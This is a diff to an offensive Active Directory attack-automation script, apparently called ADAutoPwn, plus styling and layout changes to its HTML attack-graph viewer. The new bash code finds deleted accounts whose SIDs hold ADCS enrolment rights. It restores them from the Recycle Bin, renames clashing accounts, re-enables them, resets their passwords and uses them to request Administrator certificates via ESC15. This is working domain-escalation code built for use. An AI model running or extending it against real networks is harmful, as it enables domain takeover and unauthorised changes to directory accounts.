@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.16.0"
+readonly VERSION="1.17.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -169,6 +169,7 @@ declare -A REQUEUED_SELF=()       # user (lc) re-assessed once after a self-grou
 declare -A CHAIN_FROM=()          # identity (lc) → the identity we pivoted FROM to reach it
 declare -A CHAIN_VIA=()           # identity (lc) → the technique that yielded it
 declare -A ABUSED_GLOBAL=()       # "target:right" already abused (across phases), fire once
+declare -A DELETED_SID=()         # objectSid (lc) → "dn<TAB>sam" of an AD-Recycle-Bin object
 KERB_DONE=0                       # Kerberoast request runs once (SPN set is domain-wide)
 # Groups that mean "this account is effectively privileged" → crown it in the summary
 ADMIN_GROUP_RE='Domain Admins|Enterprise Admins|Schema Admins|Administrators|Account Operators|Backup Operators|Server Operators|Print Operators|DnsAdmins|Group Policy Creator Owners|Enterprise Key Admins|Key Admins|Domain Controllers'
@@ -1838,6 +1839,45 @@ _adcs_relay() {
 # precisely, NOT blindly: only v1 templates THIS identity can enrol (its name, its
 # groups, or Authenticated/Domain Users in the enrolment rights). Generic, no
 # hard-coded template/box. Stops at the first Administrator.
+# An ADCS template's enrol right can point at an UNRESOLVED SID (certipy: "Failed
+# to lookup object with SID X") — frequently a DELETED account. If that SID is in
+# the AD Recycle Bin, restore THAT exact tombstone (it keeps its SID → it regains
+# the enrol right), reset it, and queue it; the engine then finishes ESC15 as it.
+# Pure SID correlation (enrol SIDs ∩ deleted-object SIDs) — no hard-coded names.
+_adcs_restore_enroller() {   # _adcs_restore_enroller <space-separated SIDs>
+    [[ "$DO_ABUSE" != "1" ]] && return 1
+    have bloodyAD || return 1
+    [[ ${#DELETED_SID[@]} -eq 0 ]] && return 1
+    local ba; mapfile -t ba < <(bloody_args)
+    local sid rec dn sam act
+    for sid in $1; do
+        rec="${DELETED_SID[${sid,,}]:-}"; [[ -z "$rec" ]] && continue
+        dn="${rec%%$'\t'*}"; sam="${rec#*$'\t'}"
+        [[ -z "$dn" || -z "$sam" ]] && continue
+        warn "ESC15 enroller is a DELETED account: ${C_BOLD}${sam}${C_RESET} (SID ${sid}) → restoring the original"
+        confirm "  Restore deleted enroller '${sam}' from the Recycle Bin?" || continue
+        # name conflict: a same-name account is active (e.g. a different tombstone we
+        # restored earlier) → rename it aside so the real, SID-matching one returns.
+        act=$(bloodyAD "${ba[@]}" get object "$sam" --attr distinguishedName 2>/dev/null | grep -oiP 'distinguishedName:\s*\K.+' | head -1)
+        if [[ -n "$act" && "$act" != "$dn" ]]; then
+            bloodyAD "${ba[@]}" set object "$act" sAMAccountName -v "${sam}_old" 2>&1 | tee -a "$LOGFILE" >/dev/null \
+                && rb_record "Renamed conflicting $sam → ${sam}_old" "bloodyAD ${ba[*]} set object '$act' sAMAccountName -v '$sam'"
+        fi
+        if bloodyAD "${ba[@]}" set restore "$dn" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'restored|success'; then
+            rb_record "Restored ADCS enroller $sam ($sid)" "echo 'Manual: re-delete $sam if the client needs it'"
+            bloodyAD "${ba[@]}" remove uac "$sam" -f ACCOUNTDISABLE 2>&1 >/dev/null
+            bloodyAD "${ba[@]}" set password "$sam" "$PIVOT_PW" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|changed'
+            loot "★ Restored+reset enroller '${sam}' → pivoting to finish ESC15 as it"
+            note_cred_source "$sam" "Recycle Bin restore of ADCS enroller (SID-matched)"
+            unset "SEEN_CREDS[${sam,,}]"; unset "OWNED_GROUPS[${sam,,}]"
+            queue_cred "$sam" "$PIVOT_PW" "" "Recycle Bin restore (ADCS enroller)"
+            return 0
+        fi
+        warn "  could not restore '${sam}'"
+    done
+    return 1
+}
+
 _adcs_esc15_blind() {
     local ca="$1"; have certipy || return 1
     _adcs_setauth
@@ -1865,6 +1905,10 @@ _adcs_esc15_blind() {
         loot "ESC15 candidate: v1+ESS template '${t}' → requesting an Administrator cert (EKUwu)"
         _adcs_req_admin "$ca" "$t" "ESC15(EKUwu)" 1 -application-policies 'Client Authentication' && return 0
     done <<<"$tpls"
+    # All v1+ESS templates were denied — the real enroller may be a DELETED account
+    # whose SID is in the enrol ACE (certipy couldn't resolve it). Cross-reference
+    # the SIDs in the template enum with the AD Recycle Bin and restore the match.
+    _adcs_restore_enroller "$(grep -oiE 'S-1-5-21-[0-9-]+' <<<"$full" | sort -u)" && return 0
     return 1
 }
 
@@ -1968,11 +2012,21 @@ phase_recycle_disabled() {
     # show-deactivated-link (…2065) controls together — passing only one returns
     # nothing even when you hold restore rights (this is general, not lab-specific).
     del=$(bloodyAD "${ba[@]}" get search --filter '(isDeleted=TRUE)' \
-            --attr sAMAccountName,distinguishedName,lastKnownParent \
+            --attr sAMAccountName,distinguishedName,lastKnownParent,objectSid \
             -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 2>&1)
     if echo "$del" | grep -qiE 'noSuchObject|denied|ERROR|Traceback'; then
         info "Deleted objects not accessible with this identity (need rights / Recycle Bin)"
     elif echo "$del" | grep -qi 'distinguishedName'; then
+        # Index every tombstone by its objectSid (a deleted object KEEPS its SID).
+        # Lets ESC15 (and others) map an unresolved ACE SID → "restore THIS account".
+        while IFS=$'\t' read -r _sid _dn _sam; do
+            [[ -n "$_sid" && -n "$_dn" ]] && DELETED_SID["${_sid,,}"]="${_dn}"$'\t'"${_sam}"
+        done < <(echo "$del" | awk '
+            /^distinguishedName:/{dn=$0; sub(/^distinguishedName:[ ]*/,"",dn)}
+            /^sAMAccountName:/{sam=$0; sub(/^sAMAccountName:[ ]*/,"",sam)}
+            /^objectSid:/{sid=$0; sub(/^objectSid:[ ]*/,"",sid)}
+            /^[[:space:]]*$/{ if(dn ~ /DEL:/ && sid ~ /^S-1-5-21-/) print sid"\t"dn"\t"sam; dn="";sam="";sid="" }
+            END{ if(dn ~ /DEL:/ && sid ~ /^S-1-5-21-/) print sid"\t"dn"\t"sam }')
         echo "$del" | grep -oiP 'distinguishedName:\s*\K.*DEL:[^,]+.*' | while read -r dn; do
             echo -e "      ${C_MAGENTA}· $dn${C_RESET}"; done
         echo "$del" >"$OUTDIR/deleted_objects.txt"
@@ -2569,11 +2623,11 @@ HTML_TEMPLATE = r'''<!doctype html>
 <title>ADAutoPwn · Attack Graph</title>
 <style>
   :root{
-    --user:#4ea1ff; --group:#ffca3a; --computer:#ff6b6b; --domain:#36d399;
-    --gpo:#b794f6; --ou:#7dd3fc; --base:#94a3b8;
-    --path:#ff2d6d; --gold:#ffd24a; --owned:#ff3b3b;
-    --bg0:#0a0e16; --bg1:#11161f; --ink:#e6edf3; --muted:#9aa7b8;
-    --glass:rgba(20,26,38,.72); --line:rgba(255,255,255,.08);
+    --user:#5aa7ff; --group:#f5c84c; --computer:#ff7676; --domain:#47d7a0;
+    --gpo:#b69cff; --ou:#74d6f7; --base:#9aa8bb;
+    --path:#ff4d7d; --gold:#ffd45a; --owned:#ff4a4a;
+    --bg0:#090d13; --bg1:#101722; --ink:#edf4fb; --muted:#9aa8ba;
+    --glass:rgba(15,21,31,.78); --line:rgba(255,255,255,.10);
   }
   *{box-sizing:border-box;margin:0;padding:0}
   html,body{height:100%;overflow:hidden;font-family:"Inter",system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
@@ -2586,9 +2640,8 @@ HTML_TEMPLATE = r'''<!doctype html>
   .glass{background:var(--glass);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);
     border:1px solid var(--line);border-radius:16px;
     box-shadow:0 10px 40px rgba(0,0,0,.45),inset 0 1px 0 rgba(255,255,255,.05)}
-  #header{position:fixed;top:18px;left:20px;padding:14px 18px;z-index:5}
-  #header h1{font-size:17px;font-weight:800;letter-spacing:.3px;
-    background:linear-gradient(90deg,#fff,#9fe7ff 40%,#7dffc4);-webkit-background-clip:text;background-clip:text;color:transparent}
+  #header{position:fixed;top:18px;left:20px;padding:13px 17px;z-index:5}
+  #header h1{font-size:16px;font-weight:800;letter-spacing:.2px;color:#f6fbff}
   #header .sub{font-size:11px;color:var(--muted);margin-top:3px;letter-spacing:.4px}
   #header .sub b{color:#cfe8ff;font-weight:600}
   #search{position:fixed;top:18px;right:20px;z-index:5;display:flex;gap:8px;align-items:center;padding:8px 10px}
@@ -2607,7 +2660,7 @@ HTML_TEMPLATE = r'''<!doctype html>
   #results .r small{color:var(--muted);margin-left:auto}
   #dock{position:fixed;top:120px;left:20px;z-index:5;display:flex;flex-direction:column;gap:6px;max-width:210px}
   #dock .qlabel{font-size:9.5px;letter-spacing:1.6px;color:#5b6677;margin:8px 2px 1px;font-weight:700}
-  .tab.active{border-color:rgba(255,210,74,.7);color:#ffd24a;background:rgba(255,210,74,.08)}
+  .tab.active{border-color:rgba(255,212,90,.68);color:#ffd45a;background:rgba(255,212,90,.08)}
   .tab{cursor:pointer;font-family:inherit;font-size:12px;font-weight:600;color:var(--ink);text-align:left;
     background:var(--glass);backdrop-filter:blur(14px);border:1px solid var(--line);border-radius:11px;padding:9px 13px;
     box-shadow:0 8px 26px rgba(0,0,0,.4);transition:.15s}
@@ -2762,8 +2815,7 @@ const incE=N.map(()=>[]);                 // incident edge indices per node
 E.forEach((e,i)=>{nb[e.s].add(e.t);nb[e.t].add(e.s);incE[e.s].push(i);incE[e.t].push(i);});
 const deg=N.map((_,i)=>incE[i].length);
 N.forEach((n,i)=>{n._i=i; n.r=(n.type==="Domain"?14:n.hv?10:7)+Math.min(deg[i]*0.22,5);
-  const a=Math.random()*6.28, rad=120+Math.random()*240;
-  n.x=Math.cos(a)*rad; n.y=Math.sin(a)*rad; n.vx=0; n.vy=0;});
+  n.x=0; n.y=0; n.vx=0; n.vy=0; n.fx=null; n.fy=null; n.pinned=false;});
 
 // Directed adjacency (s → t) for shortest-path queries, like BloodHound.
 const outAdj=N.map(()=>[]), inAdj=N.map(()=>[]);
@@ -2808,7 +2860,53 @@ let visArr=[], VE=[], curView="owned";
 function refresh(){ visArr=[...vis]; const s=new Set();
   visArr.forEach(i=>incE[i].forEach(ei=>{const e=E[ei]; if(vis.has(e.s)&&vis.has(e.t))s.add(ei);}));
   VE=[...s]; updateCount(); if(typeof updateHint==="function") updateHint(); }
-function expand(i){ vis.add(i); nb[i].forEach(j=>vis.add(j)); refresh(); reheat(); }
+function placeAround(anchor, nodes){
+  const a=N[anchor], list=[...nodes].filter(i=>i!==anchor && !N[i].pinned);
+  const base=120+Math.min(list.length*9,260);
+  list.forEach((i,k)=>{
+    const n=N[i];
+    if(n.x || n.y) return;
+    const ang=(k/list.length)*Math.PI*2 + hash01(n.id||n.label)*0.8;
+    const r=base + (k%4)*48;
+    n.x=a.x+Math.cos(ang)*r; n.y=a.y+Math.sin(ang)*r;
+    n.vx=0; n.vy=0; n.fx=null; n.fy=null;
+  });
+}
+function expand(i){
+  const before=new Set(vis);
+  vis.add(i); nb[i].forEach(j=>vis.add(j));
+  const added=[...vis].filter(j=>!before.has(j));
+  placeAround(i, added);
+  refresh(); requestDraw();
+}
+
+function hash01(s){ let h=2166136261; s=(s||"")+"";
+  for(let i=0;i<s.length;i++){ h^=s.charCodeAt(i); h=Math.imul(h,16777619); }
+  return ((h>>>0)%100000)/100000;
+}
+function seedVisible(q){
+  const arr=[...vis];
+  const buckets={Domain:[],Computer:[],Group:[],User:[],GPO:[],OU:[],Container:[],Base:[]};
+  arr.forEach(i=>(buckets[N[i].type]||buckets.Base).push(i));
+  Object.values(buckets).forEach(a=>a.sort((x,y)=>deg[y]-deg[x] || (N[x].label||"").localeCompare(N[y].label||"")));
+  const centers={
+    Domain:[0,-260],Computer:[360,-60],Group:[-360,-40],User:[0,260],
+    GPO:[-520,260],OU:[520,260],Container:[520,260],Base:[0,0]
+  };
+  const spread=Math.max(120,Math.min(420,80+arr.length*1.8));
+  Object.entries(buckets).forEach(([type,list])=>{
+    const [cx,cy]=centers[type]||centers.Base;
+    list.forEach((i,k)=>{
+      const n=N[i]; if(n.pinned) return;
+      const ring=Math.floor(Math.sqrt(k));
+      const pos=k-ring*ring;
+      const per=Math.max(1,ring*2+1);
+      const a=(pos/per)*Math.PI*2 + hash01(n.id||n.label)*0.9;
+      const r=ring*58 + hash01(n.label)*spread*0.22;
+      n.x=cx+Math.cos(a)*r; n.y=cy+Math.sin(a)*r; n.vx=0; n.vy=0; n.fx=null; n.fy=null;
+    });
+  });
+}
 
 // Switch the displayed query/view. Reseeds positions for a clean layout.
 function applyView(q){
@@ -2823,8 +2921,8 @@ function applyView(q){
   // For "none" (boot) and "owned" we intentionally allow an empty set — owned is
   // whatever the operator has marked, and an empty graph is the desired start.
   if(vis.size<1 && q!=="none" && q!=="owned"){ [...N.keys()].sort((a,b)=>deg[b]-deg[a]).slice(0,15).forEach(i=>vis.add(i)); }
-  [...vis].forEach(i=>{const a=Math.random()*6.28,rad=120+Math.random()*260;
-    N[i].x=Math.cos(a)*rad; N[i].y=Math.sin(a)*rad; N[i].vx=N[i].vy=0; N[i].fx=N[i].fy=null;});
+  [...vis].forEach(i=>{N[i].pinned=false; N[i].fx=N[i].fy=null;});
+  seedVisible(q);
   refresh(); if(typeof select==="function") select(-1);
   document.querySelectorAll('#dock .q').forEach(b=>b.classList.toggle('active', b.dataset.q===q));
   if(typeof updateHint==="function") updateHint(q);
@@ -2840,44 +2938,13 @@ let W=0,Hh=0,DPR=Math.min(window.devicePixelRatio||1,2);
 function resize(){W=innerWidth;Hh=innerHeight;cv.width=W*DPR;cv.height=Hh*DPR;cv.style.width=W+"px";cv.style.height=Hh+"px";ctx.setTransform(DPR,0,0,DPR,0,0);requestDraw();}
 addEventListener("resize",resize);
 
-let scale=1, tx=0, ty=0, alpha=1;
+let scale=1, tx=0, ty=0;
 function toScreen(x,y){return [x*scale+tx, y*scale+ty];}
 function toWorld(px,py){return [(px-tx)/scale,(py-ty)/scale];}
 
-// ---- physics over the VISIBLE set only (bounded cost) ----------------------
-function step(){
-  if(alpha<0.02) return false;
-  const arr=visArr, m=arr.length;
-  // more breathing room as the set grows → no clumping
-  const GRAV = 0.0016, LINK = 150 + Math.min(m*1.5, 120);
-  for(let a=0;a<m;a++){const A=N[arr[a]]; if(A.fx!=null)continue;
-    for(let b=a+1;b<m;b++){const B=N[arr[b]];
-      let dx=A.x-B.x, dy=A.y-B.y, d2=dx*dx+dy*dy+0.01; if(d2>500000)continue;
-      let d=Math.sqrt(d2), ux=dx/d, uy=dy/d;
-      let f=3400/d2;                                  // base repulsion
-      const mind=A.r+B.r+26;                          // hard anti-overlap
-      if(d<mind) f += (mind-d)*0.9;
-      A.vx+=ux*f;A.vy+=uy*f; B.vx-=ux*f;B.vy-=uy*f;}}
-  VE.forEach(ei=>{const e=E[ei],A=N[e.s],B=N[e.t]; let dx=B.x-A.x,dy=B.y-A.y;
-    let d=Math.sqrt(dx*dx+dy*dy)||1; const f=(d-LINK)*0.018, ux=dx/d, uy=dy/d;
-    A.vx+=ux*f;A.vy+=uy*f; B.vx-=ux*f;B.vy-=uy*f;});
-  let mx=0;
-  arr.forEach(i=>{const n=N[i];
-    n.vx+=-n.x*GRAV; n.vy+=-n.y*GRAV;                // gentle centering, no drift
-    if(n.fx!=null){n.x=n.fx;n.y=n.fy;n.vx=n.vy=0;return;}
-    n.vx*=0.84; n.vy*=0.84;
-    if(n.vx>50)n.vx=50; else if(n.vx<-50)n.vx=-50;  // clamp → never explodes
-    if(n.vy>50)n.vy=50; else if(n.vy<-50)n.vy=-50;
-    n.x+=n.vx*alpha; n.y+=n.vy*alpha; mx=Math.max(mx,Math.abs(n.vx)+Math.abs(n.vy));});
-  alpha*=0.985;
-  return alpha>=0.02 && mx>0.4;                      // tells the loop when to stop
-}
-
-// ---- render-on-demand loop: runs only while moving, then idles at 0% CPU ---
-let running=false;
-function tick(){ const moving=step(); draw(); if(moving) requestAnimationFrame(tick); else running=false; }
-function requestDraw(){ if(!running){ running=true; requestAnimationFrame(tick); } }
-function reheat(){ alpha=Math.max(alpha,0.7); requestDraw(); }
+// ---- render-on-demand: draw one frame only when state changes ----------------
+let drawQueued=false;
+function requestDraw(){ if(drawQueued)return; drawQueued=true; requestAnimationFrame(()=>{drawQueued=false; draw();}); }
 
 let hover=-1, sel=-1;
 function draw(){
@@ -2956,11 +3023,11 @@ function pick(px,py){let best=-1,bd=1e9;
 // ---- interaction ----
 let dragN=-1, panning=false, lastx=0,lasty=0, moved=false;
 cv.addEventListener("mousedown",ev=>{const i=pick(ev.clientX,ev.clientY); moved=false;
-  if(i>=0){dragN=i;N[i].fx=N[i].x;N[i].fy=N[i].y;reheat();}
+  if(i>=0){dragN=i;N[i].fx=N[i].x;N[i].fy=N[i].y;cv.classList.add("grab");requestDraw();}
   else{panning=true;cv.classList.add("grab");} lastx=ev.clientX;lasty=ev.clientY;});
 addEventListener("mousemove",ev=>{
   const dx=ev.clientX-lastx, dy=ev.clientY-lasty; if(Math.abs(dx)+Math.abs(dy)>3)moved=true;
-  if(dragN>=0){const [wx,wy]=toWorld(ev.clientX,ev.clientY);N[dragN].fx=wx;N[dragN].fy=wy;N[dragN].x=wx;N[dragN].y=wy;reheat();}
+  if(dragN>=0){const [wx,wy]=toWorld(ev.clientX,ev.clientY);N[dragN].fx=wx;N[dragN].fy=wy;N[dragN].x=wx;N[dragN].y=wy;requestDraw();}
   else if(panning){tx+=dx;ty+=dy;requestDraw();}
   else{const i=pick(ev.clientX,ev.clientY); if(i!==hover){hover=i;requestDraw();}
     const tip=document.getElementById("tip");
@@ -2970,7 +3037,11 @@ addEventListener("mousemove",ev=>{
     else{tip.style.display="none";cv.style.cursor="";}}
   lastx=ev.clientX;lasty=ev.clientY;});
 addEventListener("mouseup",ev=>{
-  if(dragN>=0){if(!moved){select(dragN);expand(dragN);} N[dragN].fx=null;N[dragN].fy=null;dragN=-1;}
+  if(dragN>=0){
+    if(!moved){select(dragN);expand(dragN);N[dragN].fx=null;N[dragN].fy=null;N[dragN].pinned=false;}
+    else{N[dragN].pinned=true;N[dragN].fx=N[dragN].x;N[dragN].fy=N[dragN].y;}
+    dragN=-1;cv.classList.remove("grab");requestDraw();
+  }
   else if(panning){panning=false;cv.classList.remove("grab"); if(!moved){select(-1);} requestDraw();}
 });
 cv.addEventListener("wheel",ev=>{ev.preventDefault();const f=ev.deltaY<0?1.12:1/1.12;
@@ -3053,9 +3124,12 @@ document.getElementById("pclose").addEventListener("click",()=>select(-1));
 
 // ---- bring a node (or an edge's two ends) into view + select ----
 function recenter(cx,cy){ scale=Math.max(scale,1.1); tx=W/2-cx*scale; ty=Hh/2-cy*scale; }
-function focusNode(i){ vis.add(i); nb[i].forEach(j=>vis.add(j)); refresh(); recenter(N[i].x,N[i].y); select(i); reheat(); }
-function focusEdge(s,t){ vis.add(s); vis.add(t); nb[s].forEach(j=>vis.add(j)); refresh();
-  recenter((N[s].x+N[t].x)/2,(N[s].y+N[t].y)/2); select(s); reheat(); }
+function focusNode(i){ const before=new Set(vis); vis.add(i); nb[i].forEach(j=>vis.add(j));
+  const added=[...vis].filter(j=>!before.has(j)); if(added.length===vis.size) seedVisible("search"); else placeAround(i, added);
+  refresh(); recenter(N[i].x,N[i].y); select(i); requestDraw(); }
+function focusEdge(s,t){ const before=new Set(vis); vis.add(s); vis.add(t); nb[s].forEach(j=>vis.add(j));
+  const added=[...vis].filter(j=>!before.has(j)); placeAround(s, added);
+  refresh(); recenter((N[s].x+N[t].x)/2,(N[s].y+N[t].y)/2); select(s); requestDraw(); }
 
 // ---- search across ALL nodes with a live results dropdown ----
 const q=document.getElementById("q"), results=document.getElementById("results");
@@ -3117,8 +3191,8 @@ btnUsers.addEventListener("click",()=>openFindings("users"));
 document.getElementById("findClose").addEventListener("click",closeFindings);
 document.getElementById("ffilter").addEventListener("input",e=>{(fmode==="find"?buildFindings:buildUsers)(e.target.value);});
 
-// ---- warm up the layout synchronously, then fit (deterministic first paint)
-function warmup(iters){ alpha=1; for(let k=0;k<(iters||420);k++) step(); fit(); fitted=true; requestDraw(); }
+// ---- static first paint
+function warmup(){ fit(); fitted=true; requestDraw(); }
 
 // ---- VIEW buttons (Owned · → Domain Admins · → DC · High value · Everything)
 document.querySelectorAll('#dock .q').forEach(b=>b.addEventListener("click",()=>applyView(b.dataset.q)));
